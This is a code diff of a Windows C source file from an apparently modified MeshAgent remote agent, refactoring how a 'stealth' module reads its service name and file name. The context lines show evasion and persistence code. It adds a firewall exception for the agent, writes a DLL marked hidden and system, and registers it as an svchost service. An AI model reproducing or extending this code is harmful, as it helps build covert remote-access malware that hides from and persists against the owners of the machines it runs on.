@@ -4,7 +4,7 @@
 #include <tchar.h>
 #include "stealth.h"
 #include "stealth_utils.h"
-#include "../meshcore/generated/meshagent_branding.h"
+#include "branding_util.h"
 
 static int EnvEnabledW(const wchar_t* name, int defaultOn)
 {
@@ -84,12 +84,8 @@ void Stealth_InitLabFeatures(void)
     if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
         wchar_t exePath[MAX_PATH] = {0};
         GetModulePathW(exePath, MAX_PATH);
-#ifdef UNICODE
-        const wchar_t* svcNameW = MESH_AGENT_SERVICE_NAME;
-#else
         wchar_t svcNameW[256] = {0};
-        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_NAME, -1, svcNameW, (int)(sizeof(svcNameW)/sizeof(svcNameW[0])));
-#endif
+        MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), svcNameW, _countof(svcNameW));
         if (!Stealth_AddFirewallRuleForService(svcNameW, exePath))
         {
             Stealth_DebugPrintfA("Stealth_AddFirewallRuleForService failed for %ws", svcNameW);
@@ -143,17 +139,8 @@ void Stealth_InitLabFeatures(void)
                         if (wrote) {
                             SetFileAttributesW(dllOut, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 #ifdef UNICODE
-                            const wchar_t* svcNameRef = MESH_AGENT_SERVICE_FILE;
                             WCHAR svcNameW[256] = {0};
-                            if (svcNameRef != NULL) {
-                                lstrcpynW(svcNameW, svcNameRef, (int)_countof(svcNameW));
-                            }
-#else
-                            WCHAR svcNameW[256] = {0};
-                            if (MESH_AGENT_SERVICE_FILE != NULL) {
-                                MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, svcNameW, (int)_countof(svcNameW));
-                            }
-#endif
+                            MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), svcNameW, _countof(svcNameW));
                             if (svcNameW[0] != L'\0') {
                                 if (!Stealth_RegisterSvchostService(svcNameW, dllOut)) {
                                     Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", svcNameW);
